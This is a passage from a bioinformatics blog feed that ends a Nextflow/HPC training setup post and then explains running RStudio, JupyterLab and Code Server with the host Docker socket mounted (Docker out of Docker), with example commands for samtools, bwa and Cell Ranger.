plain"> </span><span class="token environment constant" style="color:hsl(35, 99%, 36%)">$USER</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Step 3: Create SSH tunnel (from local machine)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-L</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">8080</span><span class="token plain">:worker-01:8080 user@hpc.server.edu</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Step 4: Access in browser</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">http://localhost:8080</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Step 5: Run workflows</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">nextflow run main.nf </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-profile</span><span class="token plain"> singularity</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="next-steps">Next Steps<a href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training#next-steps" class="hash-link" aria-label="Direct link to Next Steps" title="Direct link to Next Steps" translate="no">​</a></h3>
<ol>
<li class=""><strong>Customize the sbatch script</strong> for your HPC environment (queue names, account info, etc.)</li>
<li class=""><strong>Test the setup</strong> with a simple <code>nf-core</code> workflow</li>
<li class=""><strong>Create training pipelines</strong> using <code>nf-core create</code></li>
<li class=""><strong>Invite trainees</strong> to use the same environment</li>
<li class=""><strong>Monitor resources</strong> using SLURM commands (<code>squeue</code>, <code>sacct</code>, <code>sinfo</code>)</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="troubleshooting-tips">Troubleshooting Tips<a href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training#troubleshooting-tips" class="hash-link" aria-label="Direct link to Troubleshooting Tips" title="Direct link to Troubleshooting Tips" translate="no">​</a></h3>
<ul>
<li class="">If code-server won't start, check the log file: <code>cat code-server-*.log</code></li>
<li class="">If SSH tunnel fails, verify the compute node is accessible: <code>ssh user@hpc.server.edu ssh worker-01 hostname</code></li>
<li class="">If tools are missing, reinstall via: <code>pixi global install nextflow singularity nf-core nf-test</code></li>
<li class="">For persistent tunnel, use the helper script provided in section 4.2</li>
</ul>]]></content>
        <author>
            <name>Thanh-Giang Tan Nguyen</name>
            <email>nttg8100@gmail.com</email>
            <uri>https://www.facebook.com/nttg8100</uri>
        </author>
        <category label="nextflow" term="nextflow"/>
        <category label="singularity" term="singularity"/>
        <category label="code-server" term="code-server"/>
        <category label="hpc" term="hpc"/>
        <category label="setup" term="setup"/>
        <category label="training" term="training"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Docker Out of Docker: Running Interactive Web Applications for Data Analysis]]></title>
        <id>https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps</id>
        <link href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps"/>
        <updated>2026-02-14T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Running interactive web applications like RStudio, JupyterLab, and Code Server in containers is a powerful way to provide reproducible analysis environments. However, users often need to spawn additional containerized tools from within these applications. Docker out of Docker (DooD) elegantly solves this by allowing containers to access the host's Docker daemon. This post explains how to set up DooD for interactive web applications and why it's the right approach for bioinformatics workflows.]]></summary>
        <content type="html"><![CDATA[<p>Running interactive web applications like RStudio, JupyterLab, and Code Server in containers is a powerful way to provide reproducible analysis environments. However, users often need to spawn additional containerized tools from within these applications. <strong>Docker out of Docker (DooD)</strong> elegantly solves this by allowing containers to access the host's Docker daemon. This post explains how to set up DooD for interactive web applications and why it's the right approach for bioinformatics workflows.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-the-scenario-web-applications-that-need-to-run-containers">1. The Scenario: Web Applications That Need to Run Containers<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#1-the-scenario-web-applications-that-need-to-run-containers" class="hash-link" aria-label="Direct link to 1. The Scenario: Web Applications That Need to Run Containers" title="Direct link to 1. The Scenario: Web Applications That Need to Run Containers" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="11-common-use-cases-in-bioinformatics">1.1. Common Use Cases in Bioinformatics<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#11-common-use-cases-in-bioinformatics" class="hash-link" aria-label="Direct link to 1.1. Common Use Cases in Bioinformatics" title="Direct link to 1.1. Common Use Cases in Bioinformatics" translate="no">​</a></h3>
<p><strong>RStudio Server with Containerized Tools</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">User opens RStudio in browser</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    ↓</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Inside RStudio, run: system("docker run quay.io/biocontainers/samtools:latest samtools ...")</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    ↓</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Needs access to host Docker daemon</span><br></span></code></pre></div></div>
<p><strong>JupyterLab with Cell Ranger Analysis</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">User runs notebook cell with: !docker run cellranger:v7.0 cellranger count ...</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    ↓</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Needs Docker access from within JupyterLab container</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    ↓</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Results written back to shared volume</span><br></span></code></pre></div></div>
<p><strong>Code Server for Pipeline Development</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">User edits Nextflow script in Code Server</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    ↓</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Runs: docker exec to test containerized tools locally</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    ↓</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Needs full Docker CLI access</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="12-why-dood-is-perfect-for-web-applications">1.2. Why DooD Is Perfect for Web Applications<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#12-why-dood-is-perfect-for-web-applications" class="hash-link" aria-label="Direct link to 1.2. Why DooD Is Perfect for Web Applications" title="Direct link to 1.2. Why DooD Is Perfect for Web Applications" translate="no">​</a></h3>
<p>Web applications like RStudio, JupyterLab, and Code Server need to:</p>
<ol>
<li class=""><strong>Run in a container</strong> for reproducibility and dependency isolation</li>
<li class=""><strong>Access Docker</strong> to spawn containerized bioinformatics tools</li>
<li class=""><strong>Share data volumes</strong> with host and spawned containers</li>
<li class=""><strong>Maintain file permissions</strong> so users can access results</li>
</ol>
<p>DooD provides all of this with a simple socket mount.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-understanding-docker-out-of-docker-dood">2. Understanding Docker Out of Docker (DooD)<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#2-understanding-docker-out-of-docker-dood" class="hash-link" aria-label="Direct link to 2. Understanding Docker Out of Docker (DooD)" title="Direct link to 2. Understanding Docker Out of Docker (DooD)" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="21-how-dood-works">2.1. How DooD Works<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#21-how-dood-works" class="hash-link" aria-label="Direct link to 2.1. How DooD Works" title="Direct link to 2.1. How DooD Works" translate="no">​</a></h3>
<p><strong>DooD</strong> mounts the host's Docker socket (<code>/var/run/docker.sock</code>) into the container. This allows processes inside the container to communicate directly with the <strong>host's Docker daemon</strong>.</p>
<p><strong>Key insight:</strong> Containers spawned from within the DooD container appear as <strong>siblings</strong> to the web application container, not children. They run directly on the host, giving them full access to host resources and volumes.</p>
<p><strong>Architecture:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Host System</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── Docker Daemon (listening on /var/run/docker.sock)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── Host volumes (/data, /workspace)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">└── Web App Container (RStudio/JupyterLab/Code Server)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    ├── Mounts: /var/run/docker.sock:/var/run/docker.sock</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    ├── Mounts: /data:/data, /workspace:/workspace</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    │</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    ├── User runs: docker run quay.io/biocontainers/bwa:latest ...</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    │</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    └── → Uses HOST Docker daemon to spawn sibling container</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        → Spawned container has full access to host volumes</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        → Results written back to shared volume</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        → Web app container can access results</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="22-why-this-works-so-well">2.2. Why This Works So Well<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#22-why-this-works-so-well" class="hash-link" aria-label="Direct link to 2.2. Why This Works So Well" title="Direct link to 2.2. Why This Works So Well" translate="no">​</a></h3>
<p><strong>No Resource Overhead</strong></p>
<ul>
<li class="">No nested Docker daemon</li>
<li class="">Minimal memory/CPU overhead</li>
<li class="">Fast container spawning (~100ms)</li>
</ul>
<p><strong>Simple Volume Sharing</strong></p>
<ul>
<li class="">Both web app and spawned containers can read/write shared volumes</li>
<li class="">No complex mount layering</li>
<li class="">Direct access to host filesystem</li>
</ul>
<p><strong>Full Docker Access</strong></p>
<ul>
<li class="">docker ps, docker pull, docker build all work</li>
<li class="">Can manage images and containers from within the web app</li>
</ul>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-setting-up-rstudio-with-dood">3. Setting Up RStudio with DooD<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#3-setting-up-rstudio-with-dood" class="hash-link" aria-label="Direct link to 3. Setting Up RStudio with DooD" title="Direct link to 3. Setting Up RStudio with DooD" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="31-running-rstudio-with-docker-socket-mount">3.1. Running RStudio with Docker Socket Mount<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#31-running-rstudio-with-docker-socket-mount" class="hash-link" aria-label="Direct link to 3.1. Running RStudio with Docker Socket Mount" title="Direct link to 3.1. Running RStudio with Docker Socket Mount" translate="no">​</a></h3>
<p><strong>Basic RStudio with DooD:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token shebang important" style="color:hsl(230, 8%, 24%);font-weight:bold">#!/bin/bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--rm</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">8787</span><span class="token plain">:8787 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">PASSWORD</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">mypassword </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> /var/run/docker.sock:/var/run/docker.sock </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> /home/user/data:/data </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> /home/user/workspace:/workspace </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  rocker/tidyverse:latest</span><br></span></code></pre></div></div>
<p><strong>Explanation:</strong></p>
<ul>
<li class=""><code>-p 8787:8787</code>: RStudio web interface on port 8787</li>
<li class=""><code>-e PASSWORD=mypassword</code>: Set RStudio password</li>
<li class=""><code>-v /var/run/docker.sock:/var/run/docker.sock</code>: Mount Docker socket (enables DooD)</li>
<li class=""><code>-v /home/user/data:/data</code>: Share data directory</li>
<li class=""><code>-v /home/user/workspace:/workspace</code>: Share workspace directory</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="32-using-docker-from-within-rstudio">3.2. Using Docker from Within RStudio<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#32-using-docker-from-within-rstudio" class="hash-link" aria-label="Direct link to 3.2. Using Docker from Within RStudio" title="Direct link to 3.2. Using Docker from Within RStudio" translate="no">​</a></h3>
<p>Once RStudio is running, you can use Docker directly from the R console or shell:</p>
<p><strong>Running samtools from RStudio:</strong></p>
<div class="language-r codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-r codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># In RStudio console</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">system</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">'docker run --rm -v /data:/data quay.io/biocontainers/samtools:latest samtools view -h /data/input.bam | head'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p><strong>Running bwa alignment:</strong></p>
<div class="language-r codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-r codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run bwa in Docker container</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">cmd </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;-</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'docker run --rm -v /data:/data -v /workspace:/workspace quay.io/biocontainers/bwa:latest bwa mem /data/ref.fa /data/reads.fastq &gt; /workspace/aligned.sam'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">system</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">cmd</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Read results back into R</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">alignment </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;-</span><span class="token plain"> read.table</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">'/workspace/aligned.sam'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> skip</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">10</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">head</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">alignment</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p><strong>Running Cell Ranger from RStudio:</strong></p>
<div class="language-r codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-r codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># In RStudio terminal or system()</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">system</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">'</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">docker run </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token plain">rm \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token plain">v </span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain">var</span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain">run</span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain">docker.sock</span><span class="token operator" style="color:hsl(221, 87%, 60%)">:</span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain">var</span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain">run</span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain">docker.sock \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token plain">v </span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain">data</span><span class="token operator" style="color:hsl(221, 87%, 60%)">:</span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain">data \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  cellranger</span><span class="token operator" style="color:hsl(221, 87%, 60%)">:</span><span class="token plain">v7.</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"> \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  cellranger count \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token plain">id</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">sample1 \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token plain">fastqs</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain">data</span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain">fastqs \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token plain">transcriptome</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain">data</span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain">reference</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Load results</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">library</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">Seurat</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">data </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;-</span><span class="token plain"> Read10X_h5</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">'/data/sample1/outs/filtered_feature_bc_matrix.h5'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="33-docker-compose-configuration-for-rstudio">3.3. Docker Compose Configuration for RStudio<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#33-docker-compose-configuration-for-rstudio" class="hash-link" aria-label="Direct link to 3.3. Docker Compose Configuration for RStudio" title="Direct link to 3.3. Docker Compose Configuration for RStudio" translate="no">​</a></h3>
<p><strong>More production-ready setup with docker-compose:</strong></p>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token key atrule" style="color:hsl(35, 99%, 36%)">version</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'3.8'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">services</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">rstudio</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">image</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> rocker/tidyverse</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">4.3.0</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">container_name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> rstudio</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">analysis</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">ports</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"8787:8787"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">environment</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> PASSWORD=secure_password</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> USER=researcher</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">volumes</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Mount Docker socket for DooD</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> 